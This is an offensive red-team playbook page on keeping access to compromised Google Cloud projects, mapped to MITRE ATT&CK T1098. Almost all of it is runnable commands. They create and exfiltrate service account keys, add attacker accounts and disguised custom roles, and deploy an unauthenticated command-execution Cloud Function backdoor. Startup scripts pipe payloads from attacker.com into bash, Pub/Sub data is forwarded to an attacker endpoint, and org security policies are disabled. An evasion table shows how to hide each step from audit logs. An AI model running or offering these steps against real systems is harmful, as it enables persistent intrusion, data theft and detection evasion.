# GCP Persistence
> **MITRE ATT&CK**: Persistence > T1098 - Account Manipulation
> **Platforms**: GCP (Google Cloud Platform)
> **Required Privileges**: Medium to High
> **OPSEC Risk**: Medium

## Strategic Overview

GCP persistence exploits the hierarchy of IAM bindings, service account keys, and
serverless compute to maintain access after initial compromise is remediated. The most
durable GCP persistence mechanisms target the IAM layer -- service account keys do not
expire by default, IAM bindings persist until explicitly removed, and organization-level
permissions cascade to all projects. A red team lead must also consider Workspace
integration: if the target uses Google Workspace with GCP, persisting in Workspace
admin APIs can provide re-entry into GCP projects.

## Technical Deep-Dive

### Service Account Key Creation

```bash
# Service account keys are the most common GCP persistence method
# Keys do NOT expire by default (unlike AWS STS tokens)

# Create a key for a high-privilege existing SA
gcloud iam service-accounts keys create /tmp/persistent-key.json \
  --iam-account=admin-sa@target-project.iam.gserviceaccount.com

# Verify key works
gcloud auth activate-service-account --key-file=/tmp/persistent-key.json
gcloud projects list

# Check existing keys on a service account
gcloud iam service-accounts keys list \
  --iam-account=admin-sa@target-project.iam.gserviceaccount.com \
  --format="table(name.basename(),validAfterTime,validBeforeTime,keyType)"

# Create a NEW service account with keys (stealthier - blends with existing SAs)
gcloud iam service-accounts create svc-metrics-export \
  --display-name="Metrics Export Service" \
  --project=target-project

# Grant permissions
gcloud projects add-iam-policy-binding target-project \
  --member="serviceAccount:svc-metrics-export@target-project.iam.gserviceaccount.com" \
  --role="roles/editor"

# Create key for the new SA
gcloud iam service-accounts keys create /tmp/metrics-key.json \
  --iam-account=svc-metrics-export@target-project.iam.gserviceaccount.com

# Exfiltrate the key file -- this is your persistent access credential
```

### Custom IAM Role with Persistent Permissions

```bash
# Create a custom role that looks legitimate but includes escalation permissions
gcloud iam roles create securityAuditorV2 \
  --project=target-project \
  --title="Security Auditor v2" \
  --description="Enhanced security audit role for compliance" \
  --permissions="\
iam.serviceAccountKeys.create,\
iam.serviceAccounts.actAs,\
iam.serviceAccounts.getAccessToken,\
compute.instances.create,\
compute.instances.setServiceAccount,\
storage.objects.get,\
storage.objects.list,\
cloudfunctions.functions.create,\
cloudfunctions.functions.update,\
run.services.create"

# Bind the role to a controlled identity
gcloud projects add-iam-policy-binding target-project \
  --member="serviceAccount:svc-metrics-export@target-project.iam.gserviceaccount.com" \
  --role="projects/target-project/roles/securityAuditorV2"
```

### Cloud Function Backdoors

```bash
# Deploy a persistent backdoor as a Cloud Function
cat > /tmp/main.py << 'PYEOF'
import subprocess
import json

def backdoor(request):
    cmd = request.args.get('cmd', 'id')
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return json.dumps({'error': str(e), 'output': e.output.decode('utf-8')})
PYEOF

cat > /tmp/requirements.txt << 'EOF'
flask
EOF

gcloud functions deploy health-check-endpoint \
  --runtime=python39 \
  --trigger-http \
  --allow-unauthenticated \
  --service-account=admin-sa@target-project.iam.gserviceaccount.com \
  --source=/tmp/ \
  --entry-point=backdoor \
  --region=us-central1 \
  --memory=128MB

# Access the backdoor
curl "https://us-central1-target-project.cloudfunctions.net/health-check-endpoint?cmd=whoami"
```

### Cloud Run Backdoors

```bash
# Cloud Run provides a persistent HTTPS endpoint with custom containers

# Build and push a backdoor container
cat > /tmp/Dockerfile << 'EOF'
FROM python:3.9-slim
RUN pip install flask google-auth
COPY app.py /app.py
CMD ["python", "/app.py"]
EOF

# Push to GCR (Google Container Registry)
docker build -t gcr.io/target-project/monitoring-agent /tmp/
docker push gcr.io/target-project/monitoring-agent

# Deploy as Cloud Run service
gcloud run deploy monitoring-agent \
  --image=gcr.io/target-project/monitoring-agent \
  --platform=managed \
  --region=us-central1 \
  --allow-unauthenticated \
  --service-account=admin-sa@target-project.iam.gserviceaccount.com
```

### Pub/Sub Subscription for Data Forwarding

```bash
# Create a subscription that forwards messages to attacker infrastructure
# Useful for intercepting data flowing through Pub/Sub topics

# List existing topics
gcloud pubsub topics list

# Create a push subscription to attacker endpoint
gcloud pubsub subscriptions create audit-backup \
  --topic=production-events \
  --push-endpoint=https://attacker.com/collect \
  --ack-deadline=60

# Or create a pull subscription for periodic data collection
gcloud pubsub subscriptions create audit-archive \
  --topic=production-events

# Pull messages periodically
gcloud pubsub subscriptions pull audit-archive --limit=100 --auto-ack
```

### Compute Engine Startup Script Modification

```bash
# Modify instance startup scripts for persistent code execution
# Runs every time the instance boots

# Set project-wide startup script (affects ALL new instances)
gcloud compute project-info add-metadata \
  --metadata=startup-script='#!/bin/bash
curl -s https://attacker.com/beacon.sh | bash
# Original startup script continues below...'

# Set instance-specific startup script
gcloud compute instances add-metadata target-instance \
  --zone=us-central1-a \
  --metadata=startup-script='#!/bin/bash
curl -s https://attacker.com/implant | bash'

# SSH key persistence via project metadata
gcloud compute project-info add-metadata \
  --metadata=ssh-keys="attacker:ssh-rsa AAAA...attacker@evil.com"
# This adds an SSH key that works on ALL instances in the project

# Instance-level SSH key
gcloud compute instances add-metadata target-instance \
  --zone=us-central1-a \
  --metadata=ssh-keys="attacker:ssh-rsa AAAA...attacker@evil.com"
```

### Project-Level IAM Binding Additions

```bash
# Add IAM binding that persists until explicitly removed
# Use an external Google account for maximum durability

gcloud projects add-iam-policy-binding target-project \
  --member="user:attacker@gmail.com" \
  --role="roles/viewer"
# Viewer is less likely to be noticed than Editor/Owner

# For more access, use a custom role (see above)
gcloud projects add-iam-policy-binding target-project \
  --member="user:attacker@gmail.com" \
  --role="projects/target-project/roles/securityAuditorV2"

# Add binding at folder level (persists across project deletions/recreations)
gcloud resource-manager folders add-iam-policy-binding FOLDER_ID \
  --member="serviceAccount:persistent-sa@project.iam.gserviceaccount.com" \
  --role="roles/editor"
```

### Organization Policy Manipulation

```bash
# If you have org-level access, modify organization policies
# Disable security constraints to enable future exploitation

# List current org policies
gcloud resource-manager org-policies list --organization=ORG_ID

# Disable domain restricted sharing (allow external accounts)
gcloud resource-manager org-policies disable-enforce \
  iam.allowedPolicyMemberDomains --organization=ORG_ID

# Allow public access to resources
gcloud resource-manager org-policies disable-enforce \
  storage.publicAccessPrevention --organization=ORG_ID

# Allow external service account key creation
gcloud resource-manager org-policies disable-enforce \
  iam.disableServiceAccountKeyCreation --organization=ORG_ID
```

### Workspace Admin Persistence

```bash
# If target uses Google Workspace integrated with GCP:
# Workspace Super Admin can create GCP projects and manage IAM

# Create a Workspace admin user (requires Workspace admin access)
# Via Admin SDK Directory API:
curl -X POST "https://admin.googleapis.com/admin/directory/v1/users" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "primaryEmail": "svc-compliance@target.com",
    "name": {"givenName": "SVC", "familyName": "Compliance"},
    "password": "Compl1ance!Svc",
    "isAdmin": false,
    "orgUnitPath": "/Service Accounts"
  }'

# Grant this user roles in GCP projects
gcloud projects add-iam-policy-binding target-project \
  --member="user:svc-compliance@target.com" \
  --role="roles/editor"
```

## Detection & Evasion

| Persistence Method             | Detection Source                    | Evasion                               |
|--------------------------------|-------------------------------------|---------------------------------------|
| SA key creation                | Admin Activity Audit Logs           | Create for existing low-profile SAs   |
| IAM binding addition           | Admin Activity Audit Logs           | Use viewer role; add to existing SAs  |
| Cloud Function deploy          | Admin Activity Audit Logs           | Match naming conventions              |
| Startup script modification    | Compute API audit logs              | Append to existing scripts            |
| Org policy changes             | Admin Activity Audit Logs           | Revert after establishing access      |
| Pub/Sub subscription           | Admin Activity Audit Logs           | Name as backup/compliance             |

```bash
# Verify which audit logs are actually enabled
gcloud logging sinks list --project=target-project
gcloud logging metrics list --project=target-project

# Data Access logs are often NOT enabled by default
# Admin Activity logs are always on and cannot be disabled
```

## Cross-References

- [GCP Initial Access](gcp-initial-access.md)
- [GCP Privilege Escalation](gcp-privilege-escalation.md)
- [Cloud Attack Methodology](../cloud-methodology.md)
- [Cloud Tools Reference](../cloud-tools.md)

## References

- https://hackingthe.cloud/gcp/persistence/
- https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
- https://cloud.google.com/iam/docs/service-account-overview
- https://cloud.google.com/logging/docs/audit
- https://attack.mitre.org/techniques/T1098/
